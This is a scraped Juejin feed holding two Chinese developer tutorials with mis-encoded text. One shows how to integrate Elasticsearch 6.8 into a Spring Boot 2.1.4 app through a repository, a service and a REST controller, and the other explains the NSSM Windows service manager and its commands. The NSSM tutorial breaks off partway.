.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Elasticsearchæ˜¯ä¸€ä¸ªåŸºäºApache Luceneå¼€å‘çš„çš„æœç´¢æœåŠ¡ï¼Œæä¾›äº†ä¸€ä¸ªåˆ†å¸ƒå¼å¤šç”¨æˆ·èƒ½åŠ›çš„å…¨æ–‡æœç´¢å¼•æ“ï¼Œå¹¶åŸºäºRESTful webæ¥å£ã€‚æ”¯æŒç»“æ„åŒ–æœç´¢ã€æ•°æ®åˆ†æã€å¤æ‚çš„è¯­è¨€å¤„ç†ã€åœ°ç†ä½ç½®å’Œå¯¹è±¡é—´å…³è”å…³ç³»ç­‰åŠŸèƒ½ã€‚é‚£ä¹ˆå¦‚ä½•åœ¨SpringBooté¡¹ç›®ä¸­æ•´åˆElasticSearchæ¥å®Œæˆæ•°æ®çš„å­˜å‚¨å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹çœ‹ã€‚</p>
<p>è¿™é‡Œéœ€è¦ç‰¹åˆ«è¯´æ˜åœ¨é«˜ç‰ˆæœ¬çš„ElasticSearchå¯¹äºæ•°æ®çš„å¤„ç†æ–¹å¼ä¸ä½ç‰ˆæœ¬çš„å¤„ç†æ–¹å¼æ˜¯ä¸åŒçš„ï¼Œå¹¶ä¸”ï¼Œåœ¨Spring Bootä¸­æ‰€æ”¯æŒçš„ElasticSearchå®¢æˆ·ç«¯ç‰ˆæœ¬ä¹Ÿæ˜¯æœ‰æ‰€å·®å¼‚çš„ã€‚è¿™é‡Œæ¼”ç¤ºçš„æ˜¯åŸºäº Spring Boot 2.1.4.RELEASE ç‰ˆæœ¬å’ŒElasticSearch 6.8.0çš„ç‰ˆæœ¬å¤„ç†æ–¹å¼ã€‚</p>
<h2 data-id="heading-0">ä¾èµ–å’Œé…ç½®</h2>
<p>æ·»åŠ Elasticsearchçš„ä¾èµ–åˆ°<strong>pom.xml</strong>æ–‡ä»¶ä¸­ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>

```js
```
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>åœ¨é…ç½®æ–‡ä»¶æ–‡ä»¶ä¸­é…ç½®ElasticSearchçš„è¿æ¥</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">spring.data.elasticsearch.cluster-name</span>=my-cluster
<span class="hljs-attr">spring.data.elasticsearch.cluster-nodes</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">1.202</span>:<span class="hljs-number">9300</span>
</code></pre>
<p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„SpringBooté…ç½®ä¸­å·²ç»ä¸æ”¯æŒè¿™æ ·çš„é…ç½®æ“ä½œï¼Œéœ€è¦æ³¨æ„çš„å®ï¼Œåœ¨è¿™ä¸ªé…ç½®ä¸­å¦‚æœæ˜¯é€šè¿‡ELKè°ƒç”¨åˆ™æ·»åŠ çš„ç«¯å£æ˜¯9200ï¼Œå¦‚æœæ˜¯é€šè¿‡Javaç¨‹åºè°ƒç”¨åˆ™é…ç½®çš„è¿æ¥ç«¯å£æ˜¯9300ã€‚</p>
<h2 data-id="heading-1">å…·ä½“å®ç°</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Document</span>(indexName = <span class="hljs-string">"my_index"</span>, <span class="hljs-keyword">type</span> = <span class="hljs-string">"my_type"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDocument</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> id;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> description;

    <span class="hljs-comment">// çœç•¥æ„é€ å‡½æ•°ã€getterå’Œsetter</span>
}
</code></pre>
<p>ç»§æ‰¿ElasticsearchRepositoryæ¥å£å®ç°æ•°æ®è®¿é—®å±‚ä»£ç </p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyDocumentRepository</span> 
<span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElasticsearchRepository</span>&lt;<span class="hljs-title class_">MyDocument</span>, <span class="hljs-title class_">String</span>&gt; {
}
</code></pre>
<p>ç¼–å†™æœåŠ¡å±‚ä»£ç </p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDocumentService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">MyDocumentRepository</span> repository;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MyDocument</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">MyDocument <span class="hljs-variable language_">document</span></span>) {
        <span class="hljs-keyword">return</span> repository.<span class="hljs-title function_">save</span>(<span class="hljs-variable language_">document</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Iterable</span>&lt;<span class="hljs-title class_">MyDocument</span>&gt; <span class="hljs-title function_">findAll</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Iterable</span>&lt;<span class="hljs-title class_">MyDocument</span>&gt; all = repository.<span class="hljs-title function_">findAll</span>();
        <span class="hljs-keyword">return</span> all;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MyDocument</span> <span class="hljs-title function_">findById</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> id</span>) {
        <span class="hljs-keyword">return</span> repository.<span class="hljs-title function_">findById</span>(id).<span class="hljs-title function_">orElse</span>(<span class="hljs-literal">null</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">deleteById</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> id</span>) {
        repository.<span class="hljs-title function_">deleteById</span>(id);
    }
}
</code></pre>
<h2 data-id="heading-2">ç¼–å†™Controllerç±»è¿›è¡Œæµ‹è¯•</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/documents"</span>)
public class MyDocumentController {

    <span class="hljs-variable">@Autowired</span>
    private MyDocumentService service;

    <span class="hljs-variable">@PostMapping</span>
    public MyDocument <span class="hljs-built_in">create</span>(<span class="hljs-variable">@RequestBody</span> MyDocument document) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">service</span><span class="hljs-selector-class">.save</span>(document);
    }

    @<span class="hljs-selector-tag">GetMapping</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Iterable</span>&lt;<span class="hljs-selector-tag">MyDocument</span>&gt; <span class="hljs-selector-tag">getAll</span>() {
        <span class="hljs-selector-tag">Iterable</span>&lt;<span class="hljs-selector-tag">MyDocument</span>&gt; <span class="hljs-selector-tag">iterable</span> = <span class="hljs-selector-tag">service</span><span class="hljs-selector-class">.findAll</span>();
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">iterable</span>;
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/{id}"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">MyDocument</span> <span class="hljs-selector-tag">getById</span>(<span class="hljs-variable">@PathVariable</span> String id) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">service</span><span class="hljs-selector-class">.findById</span>(id);
    }

    @<span class="hljs-selector-tag">DeleteMapping</span>(<span class="hljs-string">"/{id}"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">deleteById</span>(<span class="hljs-variable">@PathVariable</span> String id) {
        <span class="hljs-selector-tag">service</span><span class="hljs-selector-class">.deleteById</span>(id);
    }
}
</code></pre>
<p>ä»¥ä¸Šä»£ç ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨Spring Bootæ•´åˆElasticsearchå®ç°æ•°æ®å­˜å‚¨ã€‚</p>
<p>è°ƒç”¨æ¥å£è¿›è¡Œæµ‹è¯•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e23f5d0920a4cc893100549b9b845f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6KW_6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764579359&amp;x-signature=6o2l%2F6sR0LmgmZRoY5lkS5ZWEKk%3D" alt="" loading="lazy"/></p>
<p>è·å–åˆ—è¡¨</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/925f9548d9c64d4dad62601c0873b1d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6KW_6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764579359&amp;x-signature=E2p9Ghjx8cvDyU03NHl6aqC41Vs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">æ€»ç»“</h2>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œé€šè¿‡SpringBoot 2.1.4ä¸ElasticSearch6.8.0å®Œæˆäº†æ•´åˆï¼Œå¦‚æœæƒ³è¦é€‚é…æ›´é«˜ç‰ˆæœ¬çš„ElasticSearchæˆ–è€…æ˜¯Spring Boot ï¼Œåœ¨è¿‡ç¨‹ä¸­ä¸€å®šæ³¨æ„å¯¹äºç‰ˆæœ¬å…¼å®¹æ€§çš„é€‰æ‹©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NSSMæœåŠ¡]]></title>    <link>https://juejin.cn/post/7576090441432776714</link>    <guid>https://juejin.cn/post/7576090441432776714</guid>    <pubDate>2025-11-24T08:58:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576090441432776714" data-draft-id="7576090441432416266" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NSSMæœåŠ¡"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-24T08:58:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¾œæœˆå"/> <meta itemprop="url" content="https://juejin.cn/user/2872336891512350"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NSSMæœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2872336891512350/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¾œæœˆå
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T08:58:48.000Z" title="Mon Nov 24 2025 08:58:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"â‡²"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"â€¢";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">ä¸€ã€ä»‹ç»</h2>
<blockquote>
<ul>
<li>å…¨ç§°ï¼š<code>Non-SuckingÂ ServiceÂ Manager</code></li>
<li>æ ¸å¿ƒåŠŸèƒ½ï¼šå°†ä¸€ä¸ªæ™®é€šçš„ <code>Windows</code> å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚Â <code>.exe</code>,Â <code>.bat</code>,Â <code>.py</code>,Â <code>.jar</code>Â ç­‰ï¼‰å°è£…æˆä¸€ä¸ªÂ <code>Windows</code> æœåŠ¡ã€‚</li>
<li>è§£å†³çš„é—®é¢˜ï¼šè®¸å¤šåº”ç”¨ç¨‹åºæœ¬èº«å¹¶ä¸å…·å¤‡ä½œä¸º <code>Windows</code> æœåŠ¡è¿è¡Œçš„èƒ½åŠ›ã€‚<code>NSSM</code> å……å½“ä¸€ä¸ªåŒ…è£…å™¨æˆ–å®ˆæŠ¤è¿›ç¨‹ï¼Œä½¿è¿™äº›ç¨‹åºèƒ½å¤Ÿä»¥æœåŠ¡çš„èº«ä»½åœ¨åå°è¿è¡Œï¼Œå¹¶äº«å—æœåŠ¡å¸¦æ¥çš„æ‰€æœ‰å¥½å¤„ã€‚</li>
</ul>
</blockquote>
<h2 data-id="heading-1">äºŒã€NSSMä¼˜ç‚¹</h2>
<ol>
<li>è‡ªåŠ¨å¯åŠ¨ï¼šé…ç½®ä¸º<code>è‡ªåŠ¨</code>å¯åŠ¨åï¼ŒæœåŠ¡ä¼šåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œï¼Œæ— éœ€ç”¨æˆ·ç™»å½•ã€‚</li>
<li>åå°è¿è¡Œï¼šç¨‹åºåœ¨åå°é™é»˜è¿è¡Œï¼Œæ²¡æœ‰ç”¨æˆ·ç•Œé¢ï¼Œä¸å ç”¨ä»»åŠ¡æ ä½ç½®ã€‚</li>
<li>ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼šå¯ä»¥é€šè¿‡æ ‡å‡†çš„ <code>Windows</code> æœåŠ¡ç®¡ç†ç•Œé¢ï¼ˆ<code>services.msc</code>ï¼‰æˆ–å‘½ä»¤è¡Œï¼ˆ<code>sc</code>,Â <code>net</code>ï¼‰æ–¹ä¾¿åœ°<strong>å¯åŠ¨ã€åœæ­¢ã€é‡å¯ã€æš‚åœ</strong>æœåŠ¡ã€‚</li>
<li>å´©æºƒæ¢å¤ï¼šå¯ä»¥é…ç½®æœåŠ¡åœ¨æ„å¤–é€€å‡ºæ—¶<strong>è‡ªåŠ¨é‡å¯</strong>ï¼Œå¢å¼ºç¨‹åºçš„å¥å£®æ€§ã€‚</li>
<li>ç»Ÿä¸€ç®¡ç†ï¼šå°†æ‰€æœ‰éœ€è¦é•¿æœŸè¿è¡Œçš„ç¨‹åºç»Ÿä¸€åˆ°â€œæœåŠ¡â€ä¸­è¿›è¡Œç®¡ç†ï¼Œè§„èŒƒä¸”é«˜æ•ˆã€‚</li>
<li>æƒé™æ§åˆ¶ï¼šå¯ä»¥æŒ‡å®šæœåŠ¡ä»¥ç‰¹å®šçš„ç”¨æˆ·èº«ä»½ï¼ˆå¦‚Â <code>SYSTEM</code>Â æˆ–è‡ªå®šä¹‰ç®¡ç†å‘˜è´¦æˆ·ï¼‰è¿è¡Œã€‚</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€ä¸‹è½½ä¸å®‰è£…</h2>
<ol>
<li>è®¿é—®å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnssm.cc%2Fdownload" target="_blank" title="https://nssm.cc/download" ref="nofollow noopener noreferrer">nssm.cc/download</a></li>
<li>é€‰æ‹©ç‰ˆæœ¬ï¼šä¸‹è½½æœ€æ–°ç¨³å®šç‰ˆï¼ˆå¦‚Â <code>nssm 2.24</code>ï¼‰ã€‚æ ¹æ®ä½ çš„ç³»ç»Ÿæ¶æ„ï¼ˆ32ä½æˆ–64ä½ï¼‰é€‰æ‹©å¯¹åº”çš„ ZIP åŒ…ã€‚</li>
<li>å®‰è£…ï¼š<code>NSSM</code> æ˜¯ç»¿è‰²è½¯ä»¶ï¼Œæ— éœ€å®‰è£…ã€‚åªéœ€å°† <code>ZIP</code> åŒ…è§£å‹åˆ°ä¸€ä¸ªä½ å–œæ¬¢çš„ç›®å½•ï¼Œä¾‹å¦‚Â <code>D:\nssm</code>ã€‚</li>
<li>æ·»åŠ åˆ° <code>PATH</code>ï¼ˆå¯é€‰ï¼‰ï¼šä¸ºäº†åœ¨ä»»ä½•å‘½ä»¤è¡Œçª—å£ä¸­ä½¿ç”¨Â <code>nssm</code>Â å‘½ä»¤ï¼Œå¯ä»¥å°†Â <code>nssm.exe</code>Â æ‰€åœ¨çš„è·¯å¾„æ·»åŠ åˆ°ç³»ç»Ÿçš„Â <code>PATH</code>Â ç¯å¢ƒå˜é‡ä¸­ã€‚</li>
</ol>
<h2 data-id="heading-3">å››ã€å¸¸ç”¨å‘½ä»¤</h2>
<h3 data-id="heading-4">4.1ã€æ ¸å¿ƒæœåŠ¡ç”Ÿå‘½å‘¨æœŸç®¡ç†å‘½ä»¤</h3>
<p>è¿™äº›æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç»„å‘½ä»¤ã€‚</p>








































<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>nssm install &lt;servicename&gt; [&lt;application&gt; [&lt;arguments&gt;]]</code></td><td><strong>å®‰è£…æœåŠ¡</strong>ã€‚å¦‚æœä¸æŒ‡å®šåº”ç”¨è·¯å¾„ï¼Œåˆ™ä¼šæ‰“å¼€ GUI è¿›è¡Œé…ç½®ã€‚</td><td><code>nssm install MyService</code> <code>nssm install MyService "C:\MyApp\app.exe" "-p 8080"</code></td></tr><tr><td><code>nssm start &lt;servicename&gt;</code></td><td>å¯åŠ¨æœåŠ¡ã€‚</td><td><code>nssm start MyService</code></td></tr><tr><td><code>nssm stop &lt;servicename&gt;</code></td><td>åœæ­¢æœåŠ¡ã€‚</td><td><code>nssm stop MyService</code></td></tr><tr><td><code>nssm restart &lt;servicename&gt;</code></td><td>é‡å¯æœåŠ¡ï¼ˆå…ˆåœæ­¢ï¼Œå†å¯åŠ¨ï¼‰ã€‚</td><td><code>nssm restart MyService</code></td></tr><tr><td><code>nssm pause &lt;servicename&gt;</code></td><td>æš‚åœæœåŠ¡ï¼ˆå¦‚æœæœåŠ¡æ”¯æŒï¼‰ã€‚</td><td><code>nssm pause MyService</code></td></tr><tr><td><code>nssm continue &lt;servicename&gt;</code></td><td>æ¢å¤è¢«æš‚åœçš„æœåŠ¡ï¼ˆå¦‚æœæœåŠ¡æ”¯æŒï¼‰ã€‚</td><td><code>nssm continue MyService</code></td></tr></tbody></table>
<h3 data-id="heading-5">4.2ã€æœåŠ¡é…ç½®ç®¡ç†å‘½ä»¤</h3>
<p>è¿™äº›å‘½ä»¤ç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹æœåŠ¡çš„å‚æ•°ã€‚</p>






























<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>nssm edit &lt;servicename&gt;</code></td><td>æ‰“å¼€æœåŠ¡çš„ GUI é…ç½®ç•Œé¢è¿›è¡Œä¿®æ”¹ã€‚</td><td><code>nssm edit MyService</code></td></tr><tr><td><code>nssm get &lt;servicename&gt; &lt;parameter&gt;</code></td><td><strong>è·å–</strong>æœåŠ¡æŸä¸ªé…ç½®å‚æ•°çš„å€¼ã€‚</td><td><code>nssm get MyService AppParameters</code></td></tr><tr><td><code>nssm set &lt;servicename&gt; &lt;parameter&gt; &lt;value&gt;</code></td><td><strong>è®¾ç½®</strong>æœåŠ¡æŸä¸ªé…ç½®å‚æ•°çš„å€¼ã€‚</td><td><code>nssm set MyService AppDirectory "C:\MyApp"</code></td></tr><tr><td><code>nssm reset &lt;servicename&gt; &lt;parameter&gt;</code></td><td>å°†æŸä¸ªé…ç½®å‚æ•°<strong>é‡ç½®</strong>ä¸ºé»˜è®¤å€¼ã€‚</td><td><code>nssm reset MyService ObjectName</code></td></tr></tbody></table>
<h3 data-id="heading-6">4.3ã€æœåŠ¡å®‰è£…ä¸ç§»é™¤å‘½ä»¤</h3>




















<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>nssm remove &lt;servicename&gt;</code></td><td>äº¤äº’å¼åœ°<strong>ç§»é™¤/å¸è½½</strong>æœåŠ¡ã€‚ä¼šè¦æ±‚ä½ ç¡®è®¤ã€‚</td><td><code>nssm remove MyService</code></td></tr><tr><td><code>nssm remove &lt;servicename&gt; confirm</code></td><td><strong>æ— æ¡ä»¶ç›´æ¥ç§»é™¤/å¸è½½</strong>æœåŠ¡ï¼Œæ— éœ€ç¡®è®¤ã€‚</td><td><code>nssm remove MyService confirm</code></td></tr></tbody></table>
<h3 data-id="heading-7">4.4ã€æœåŠ¡çŠ¶æ€ä¸ä¿¡æ¯æŸ¥è¯¢å‘½ä»¤</h3>

























